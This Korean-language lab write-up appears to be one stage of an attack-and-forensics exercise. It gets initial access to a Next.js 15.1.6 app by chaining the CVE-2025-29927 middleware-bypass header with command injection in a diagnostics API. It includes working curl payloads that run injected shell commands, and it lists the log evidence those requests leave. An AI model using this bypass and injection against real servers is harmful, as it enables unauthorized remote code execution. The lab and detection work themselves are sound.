# 1단계: 초기 침투 (CVE-2025-29927 인증 우회 + command injection -> RCE)

MITRE ATT&CK: T1190 (Exploit Public-Facing Application), T1059.004 (Unix Shell)

## 배경

타깃은 Next.js 15.1.6 앱이다. 두 결함이 연쇄된다.

1. **CVE-2025-29927 (미들웨어 인증 우회)**: 보호 라우트는 `middleware.ts` 로만 인증한다.
   Next.js 15.1.6은 내부 전용 헤더 `x-middleware-subrequest` 를 신뢰해, 이 값을 위조하면
   미들웨어 실행을 통째로 건너뛴다. 즉 미인증 상태로 보호 API에 도달한다.
2. **command injection**: 보호 API `POST /api/internal/diagnostics` 는 JSON 본문의 `host` 를
   `ping -c 1 <host>` 셸 명령에 그대로 이어 붙여 `child_process.exec` 로 실행한다. `host` 에 `;`
   로 임의 명령을 붙이면 RCE가 된다.

앱은 비권한 `nextjs` 계정으로 구동되므로, 이 시점 RCE 권한은 nextjs(uid≠0)다. root 획득은
다음 단계(`02_privilege_escalation.md`).

## 정찰

```bash
curl -s "http://$TARGET_IP/"                          # 공개 랜딩 확인
# 기준선: 우회 헤더 없이 보호 API 호출 -> 미들웨어가 401로 차단해야 정상
curl -s -o /dev/null -w "%{http_code}\n" -X POST \
  "http://$TARGET_IP/api/internal/diagnostics" \
  -H 'content-type: application/json' --data '{"host":"127.0.0.1"}'
```

## 취약점 악용 (우회 + RCE)

위조 헤더 `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` 로
미들웨어를 우회하고, `host` 에 명령을 주입한다. `ping` 출력은 `>/dev/null 2>&1` 로 버리고
주입 명령의 stdout만 응답 JSON의 `stdout` 필드로 돌려받는다.

```bash
BYPASS='x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
API="http://$TARGET_IP/api/internal/diagnostics"
curl -s -X POST "$API" -H 'content-type: application/json' -H "$BYPASS" \
  --data '{"host":"127.0.0.1 >/dev/null 2>&1;id"}'
curl -s -X POST "$API" -H 'content-type: application/json' -H "$BYPASS" \
  --data '{"host":"127.0.0.1 >/dev/null 2>&1;uname -a"}'
```

`id` 결과가 `uid=0(root)` 가 아니라 비권한 계정(`nextjs`)이면 정상이다. `scripts/01_rce.sh` 가
랜딩 확인 + 401 기준선 + 우회 RCE(`id`/`uname -a`)를 자동화한다.

## 남는 증거 (분석 단계 대비)

- EC2 `/var/log/webapp/access.log` 에 요청이 한 줄씩 기록된다. 위조 헤더값은 `mws="..."` 필드,
  주입 페이로드는 `host="..."` 필드에 그대로 남아 우회+주입 시도가 탐지 가능하다.
- 주입 명령으로 생성된 자식 프로세스(ping의 형제로 실행), journald.
- 이 단계는 AWS API를 부르지 않으므로 CloudTrail에는 남지 않는다(호스트 로그가 핵심).

## 실행 결과

실제 실행 시각·확인된 uid·공격자 IP 등 재구성된 타임라인은 `analysis/timeline.md`,
침해 지표는 `analysis/iocs.md` 참조.
